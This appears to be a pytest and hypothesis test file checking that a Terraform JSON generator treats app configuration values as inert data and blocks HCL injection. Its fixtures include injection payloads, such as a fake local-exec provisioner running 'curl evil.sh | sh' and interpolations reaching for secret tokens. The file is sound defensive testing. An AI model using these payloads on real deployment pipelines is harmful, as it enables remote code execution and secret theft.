"""Proves the .tf.json generator structurally closes the HCL-injection class
the old terraform_generator.py had: that generator f-string-interpolated raw
app.yml string values directly into HCL *text* with zero escaping, so a
crafted value (e.g. containing a closing brace + a fake `resource` block)
could inject arbitrary Terraform, including a `local-exec` provisioner -
i.e. arbitrary code execution on `terraform apply`.

The new generator never has a string-templating step for app.yml-sourced
values at all: every builder in `kdeploy.generators.terraform` assembles
plain Python dicts, and `json.dumps()` is the ONLY thing that ever turns that
into `.tf.json` text (see builder.render). This test feeds adversarial
strings into every field this task's spec calls out - env var values, secret
values, configmap data, RBAC rule strings, ingress host, and labels (the
`app: <name>` labels stamped everywhere) - covering every resource-type
builder (Deployment, StatefulSet, DaemonSet, Job, Service, Ingress, ConfigMap,
Secret, RBAC, HPA, PVC) and asserts, for each:

1. `json.dumps(generate_terraform(app))` never raises, and the result
   round-trips through `json.loads` back to an equal structure (trivially
   true for a plain dict, but asserted explicitly per the task spec).
2. The adversarial string appears byte-for-byte, unmodified, as a plain JSON
   string LEAF somewhere in the structure - never interpreted as new
   structure: no unexpected new top-level `resource` key appears (the
   generated document's resource-type keys are exactly the ones this app
   configuration is expected to produce, nothing extra), and walking the
   whole structure never finds the adversarial payload sitting as a dict KEY
   anywhere it wasn't deliberately used as one (env var names, secret keys,
   etc. - which are separately, normally-named in every fixture below, never
   set to the payload itself).

`app.name` is deliberately NOT a fuzz target here: `AppConfig.name` is
DNS-1123-label-validated at the schema boundary (see models.py's
`_validate_dns_label`) before a `generate_terraform` call is even possible,
so genuinely adversarial characters (quotes, `${`, braces) can never reach
the generator through that field in the first place - the defense for that
field lives one layer up, not in this generator, and asserting it again here
would just be re-testing pydantic's own validator.
"""

from __future__ import annotations

import json
import string
from typing import Any

import pytest
from hypothesis import given
from hypothesis import strategies as st

from kdeploy.generators.terraform import generate_terraform
from kdeploy.schema.models import (
    AppConfig,
    AppType,
    EnvVar,
    IngressConfig,
    InitContainer,
    Rbac,
    RbacRule,
    StorageEntry,
)

# ---------------------------------------------------------------------------
# Adversarial payloads - every category the task spec calls out.
# ---------------------------------------------------------------------------

ADVERSARIAL_STRINGS: list[str] = [
    'plain-with-a-"quote',
    "${aws_instance.x}",
    "${kubernetes_secret.evil.data.token}",
    'resource "null_resource" "x" { provisioner "local-exec" { command = "evil" } }',
    "value`with`backticks",
    "line1\nline2\nline3",
    "trailing-backslash\\",
    "null-byte\x00-and-more\x01\x02",
    '"}}\nresource "null_resource" "pwn" {\n  provisioner "local-exec" { command = "curl evil.sh | sh" }\n}\n#',
    "unicode- -line-separator-and- -para-separator",
    "",  # empty string is a valid, if edge-case, leaf too
]


def _minimal_app(name: str, **overrides: Any) -> AppConfig:
    return AppConfig(name=name, enabled=True, **overrides)


def _assert_roundtrips(tf: dict[str, Any]) -> str:
    """Requirement 1: valid JSON, round-trips without error."""
    text = json.dumps(tf)
    assert json.loads(text) == tf
    return text


def _known_resource_types(tf: dict[str, Any], expected: set[str]) -> None:
    """Requirement 2 (structure side): no unexpected new top-level resource
    type appears - i.e. the payload never manifested as new Terraform
    structure rather than inert string data."""
    actual = set(tf.get("resource", {}).keys())
    assert actual <= expected, f"unexpected resource types appeared: {actual - expected}"


def _payload_is_a_leaf_not_a_key(tf: dict[str, Any], payload: str) -> bool:
    """Walks the whole structure; returns True iff the payload appears at
    least once as a string LEAF value, and never as a dict key (dict keys in
    every fixture below are deliberately fixed, ordinary names - if the
    payload ever shows up as a key instead, something re-parsed it as
    structure rather than treating it as plain data)."""
    found_as_leaf = False

    def walk(node: Any) -> None:
        nonlocal found_as_leaf
        if isinstance(node, dict):
            for k, v in node.items():
                assert k != payload or payload == "", f"payload appeared as a dict KEY: {k!r}"
                walk(v)
        elif isinstance(node, list):
            for item in node:
                walk(item)
        elif isinstance(node, str) and (node == payload or (payload and payload in node)):
            found_as_leaf = True

    walk(tf)
    return found_as_leaf


# ---------------------------------------------------------------------------
# 1. Environment variable values (Deployment container env)
# ---------------------------------------------------------------------------

@pytest.mark.parametrize("payload", ADVERSARIAL_STRINGS)
def test_environment_value_injection(payload: str) -> None:
    app = _minimal_app(
        "envtest",
        app_type=AppType.service,
        environment=[EnvVar(name="PAYLOAD_VAR", value=payload)],
    )
    tf = generate_terraform(app)
    _assert_roundtrips(tf)
    _known_resource_types(tf, {"kubernetes_deployment", "kubernetes_service"})
    if payload:
        assert _payload_is_a_leaf_not_a_key(tf, payload)


# ---------------------------------------------------------------------------
# 2. Secret values
# ---------------------------------------------------------------------------

@pytest.mark.parametrize("payload", ADVERSARIAL_STRINGS)
def test_secret_value_injection(payload: str) -> None:
    app = _minimal_app("secrettest", app_type=AppType.service, secrets={"PAYLOAD_SECRET": payload})
    tf = generate_terraform(app)
    _assert_roundtrips(tf)
    _known_resource_types(tf, {"kubernetes_secret", "kubernetes_deployment", "kubernetes_service"})
    if payload:
        assert _payload_is_a_leaf_not_a_key(tf, payload)
    # The Secret resource's `data` map must contain the payload verbatim.
    secret_data = tf["resource"]["kubernetes_secret"]["secrettest_secret"]["data"]
    assert secret_data["PAYLOAD_SECRET"] == payload


# ---------------------------------------------------------------------------
# 3. ConfigMap data (both explicit `configmap:` dict and docker_config
#    environment_vars fallback)
# ---------------------------------------------------------------------------

@pytest.mark.parametrize("payload", ADVERSARIAL_STRINGS)
def test_configmap_value_injection(payload: str) -> None:
    app = _minimal_app("cmtest", app_type=AppType.service, configmap={"PAYLOAD_KEY": payload})
    tf = generate_terraform(app)
    _assert_roundtrips(tf)
    _known_resource_types(tf, {"kubernetes_config_map", "kubernetes_deployment", "kubernetes_service"})
    if payload:
        assert _payload_is_a_leaf_not_a_key(tf, payload)
    cm_data = tf["resource"]["kubernetes_config_map"]["cmtest_config"]["data"]
    assert cm_data["PAYLOAD_KEY"] == payload


# ---------------------------------------------------------------------------
# 4. RBAC rule strings (api_groups / resources / verbs)
# ---------------------------------------------------------------------------

@pytest.mark.parametrize("payload", ADVERSARIAL_STRINGS)
def test_rbac_rule_string_injection(payload: str) -> None:
    if payload == "":
        pytest.skip("RbacRule fields are non-empty lists of strings by real usage; empty string covered elsewhere")
    app = _minimal_app(
        "rbactest",
        app_type=AppType.infrastructure,
        rbac=Rbac(enabled=True, scope="cluster", rules=[RbacRule(api_groups=[payload], resources=[payload], verbs=[payload])]),
    )
    tf = generate_terraform(app)
    _assert_roundtrips(tf)
    _known_resource_types(
        tf,
        {
            "kubernetes_service_account",
            "kubernetes_cluster_role",
            "kubernetes_cluster_role_binding",
            "kubernetes_deployment",
            "kubernetes_service",
        },
    )
    assert _payload_is_a_leaf_not_a_key(tf, payload)
    rule = tf["resource"]["kubernetes_cluster_role"]["rbactest_cluster_role"]["rule"][0]
    assert rule["api_groups"] == [payload]
    assert rule["resources"] == [payload]
    assert rule["verbs"] == [payload]


# ---------------------------------------------------------------------------
# 5. Ingress host
# ---------------------------------------------------------------------------

@pytest.mark.parametrize("payload", ADVERSARIAL_STRINGS)
def test_ingress_host_injection(payload: str) -> None:
    if payload == "":
        pytest.skip("IngressConfig requires a non-empty host when enabled")
    app = _minimal_app(
        "ingresstest",
        app_type=AppType.service,
        ingress=IngressConfig(enabled=True, host=payload, service_port=80),
    )
    tf = generate_terraform(app)
    _assert_roundtrips(tf)
    _known_resource_types(tf, {"kubernetes_deployment", "kubernetes_service", "kubernetes_ingress_v1"})
    assert _payload_is_a_leaf_not_a_key(tf, payload)
    rule = tf["resource"]["kubernetes_ingress_v1"]["ingresstest"]["spec"]["rule"]
    assert rule["host"] == payload


# ---------------------------------------------------------------------------
# 6. Labels (the `app: <name>` label stamped on every resource) - via the
#    RBAC-scope namespace string and storage name/mount_path, which (unlike
#    `AppConfig.name` itself) are NOT DNS-1123-validated and flow directly
#    into generated `labels {}` blocks and volume/mount definitions.
# ---------------------------------------------------------------------------

@pytest.mark.parametrize("payload", ADVERSARIAL_STRINGS)
def test_storage_name_and_mount_path_injection(payload: str) -> None:
    if payload == "":
        pytest.skip("StorageEntry.name/mount_path are real, non-empty identifiers by real usage")
    app = _minimal_app(
        "storagetest",
        app_type=AppType.service,
        storage=[StorageEntry(name=payload, mount_path=payload, size="1Gi", get_or_create=False)],
    )
    tf = generate_terraform(app)
    _assert_roundtrips(tf)
    _known_resource_types(
        tf, {"kubernetes_persistent_volume_claim", "kubernetes_deployment", "kubernetes_service"}
    )
    assert _payload_is_a_leaf_not_a_key(tf, payload)
    pvc = tf["resource"]["kubernetes_persistent_volume_claim"][f"{payload}_pvc"]
    assert pvc["metadata"]["labels"]["storage"] == payload
    mount = tf["resource"]["kubernetes_deployment"]["storagetest"]["spec"]["template"]["spec"]["container"][0]["volume_mount"][0]
    assert mount["mount_path"] == payload


# ---------------------------------------------------------------------------
# 7. Namespace (flows through `namespace_ref` and into every resource's
#    metadata.namespace as a plain literal unless it's exactly "dev"/"prod")
# ---------------------------------------------------------------------------

@pytest.mark.parametrize("payload", [p for p in ADVERSARIAL_STRINGS if p not in ("dev", "prod", "")])
def test_namespace_injection(payload: str) -> None:
    app = _minimal_app("nstest", app_type=AppType.service, namespace=payload)
    tf = generate_terraform(app)
    _assert_roundtrips(tf)
    assert tf["resource"]["kubernetes_deployment"]["nstest"]["metadata"]["namespace"] == payload


# ---------------------------------------------------------------------------
# 8. Init container command/args (a genuinely different code path - list
#    values rather than single scalars)
# ---------------------------------------------------------------------------

@pytest.mark.parametrize("payload", ADVERSARIAL_STRINGS)
def test_init_container_command_injection(payload: str) -> None:
    app = _minimal_app(
        "inittest",
        app_type=AppType.service,
        init_containers=[InitContainer(name="setup", image="busybox:1.35", command=["/bin/sh", "-c", payload])],
    )
    tf = generate_terraform(app)
    _assert_roundtrips(tf)
    if payload:
        assert _payload_is_a_leaf_not_a_key(tf, payload)
    command = tf["resource"]["kubernetes_deployment"]["inittest"]["spec"]["template"]["spec"]["init_container"][0]["command"]
    assert command == ["/bin/sh", "-c", payload]


# ---------------------------------------------------------------------------
# 9. Every workload type at once, one payload, to prove StatefulSet/DaemonSet/
#    Job/microservice paths are equally safe, not just Deployment.
# ---------------------------------------------------------------------------

_PAYLOAD = 'resource "null_resource" "pwn" { provisioner "local-exec" { command = "curl evil.sh|sh" } } # "${x}'


def test_statefulset_path_injection() -> None:
    app = _minimal_app(
        "statefultest",
        app_type=AppType.infrastructure,
        environment=[EnvVar(name="X", value=_PAYLOAD)],
        storage=[StorageEntry(name="data", mount_path="/data", size="1Gi", get_or_create=False)],
    )
    tf = generate_terraform(app)
    _assert_roundtrips(tf)
    assert "kubernetes_stateful_set" in tf["resource"]
    assert _payload_is_a_leaf_not_a_key(tf, _PAYLOAD)
    # The payload must never introduce a second top-level "resource" key,
    # nor a "provisioner"/"local-exec" KEY anywhere - only ever inert text.
    # (Not asserted as a raw substring of the serialized JSON text here -
    # json.dumps correctly backslash-escapes the payload's own literal
    # quotes, so the exact unescaped substring is expected NOT to appear
    # verbatim in the serialized text; that escaping is precisely the
    # safety property under test, not a violation of it. The structural
    # checks below - and `_payload_is_a_leaf_not_a_key`'s check against the
    # *parsed* structure - are the correct way to assert "it's in there,
    # unmodified, as data".)
    _assert_no_injected_keys(tf)


def test_daemonset_path_injection() -> None:
    app = _minimal_app(
        "daemontest",
        app_type=AppType.infrastructure,
        environment=[EnvVar(name="X", value=_PAYLOAD)],
        infrastructure_config={"daemonset": True},
    )
    tf = generate_terraform(app)
    _assert_roundtrips(tf)
    assert "kubernetes_daemonset" in tf["resource"]
    assert _payload_is_a_leaf_not_a_key(tf, _PAYLOAD)
    _assert_no_injected_keys(tf)


def test_job_path_injection() -> None:
    app = _minimal_app(
        "jobtest",
        app_type=AppType.job,
        environment=[EnvVar(name="X", value=_PAYLOAD)],
    )
    tf = generate_terraform(app)
    _assert_roundtrips(tf)
    assert "kubernetes_job" in tf["resource"]
    assert _payload_is_a_leaf_not_a_key(tf, _PAYLOAD)
    _assert_no_injected_keys(tf)


def test_microservice_path_injection() -> None:
    app = _minimal_app(
        "microtest",
        app_type=AppType.microservice,
        environment=[EnvVar(name="X", value=_PAYLOAD)],
    )
    tf = generate_terraform(app)
    _assert_roundtrips(tf)
    assert "kubernetes_secret" in tf["resource"]
    assert _payload_is_a_leaf_not_a_key(tf, _PAYLOAD)
    _assert_no_injected_keys(tf)


def _assert_no_injected_keys(tf: dict[str, Any]) -> None:
    """No dict anywhere in the structure has a 'provisioner', 'resource', or
    'local-exec' key that wasn't put there deliberately by the generator
    itself (i.e. the top-level document's own `resource` key, which is
    expected) - proving the payload's embedded fake `resource "null_resource"...`
    text never got re-parsed as a second real block."""
    suspicious_keys = {"provisioner", "local-exec"}

    def walk(node: Any, is_top: bool) -> None:
        if isinstance(node, dict):
            for k, v in node.items():
                if k == "resource" and not is_top:
                    raise AssertionError("a nested 'resource' key appeared - looks like injected structure")
                assert k not in suspicious_keys, f"suspicious key {k!r} appeared in generated structure"
                walk(v, is_top=False)
        elif isinstance(node, list):
            for item in node:
                walk(item, is_top=False)

    walk(tf, is_top=True)


# ---------------------------------------------------------------------------
# Property-based fuzz: arbitrary text (including control characters,
# surrog...-adjacent unicode, quotes, and dollar-brace sequences) into an env
# var value, asserting the same two invariants hold for the whole input
# space, not just the hand-picked fixtures above.
# ---------------------------------------------------------------------------

_adversarial_text = st.text(
    alphabet=st.characters(min_codepoint=0, max_codepoint=0x2029, blacklist_categories=("Cs",)),
    min_size=0,
    max_size=200,
) | st.text(alphabet=string.printable, min_size=0, max_size=200)


@given(payload=_adversarial_text)
def test_env_value_injection_property(payload: str) -> None:
    app = _minimal_app(
        "fuzztest",
        app_type=AppType.service,
        environment=[EnvVar(name="FUZZ_VAR", value=payload)],
    )
    tf = generate_terraform(app)
    text = _assert_roundtrips(tf)
    env = tf["resource"]["kubernetes_deployment"]["fuzztest"]["spec"]["template"]["spec"]["container"][0]["env"]
    matching = [e for e in env if e["name"] == "FUZZ_VAR"]
    assert len(matching) == 1
    assert matching[0]["value"] == payload
    _assert_no_injected_keys(tf)
    # json.dumps must have actually escaped anything meaningful - the raw
    # payload appearing unescaped in the *serialized text* is only a problem
    # if it breaks JSON's own quoting, which json.loads succeeding already
    # disproves; this is an extra, more direct sanity check that quotes in
    # particular got backslash-escaped rather than left to terminate the
    # string early.
    if '"' in payload:
        assert '\\"' in text
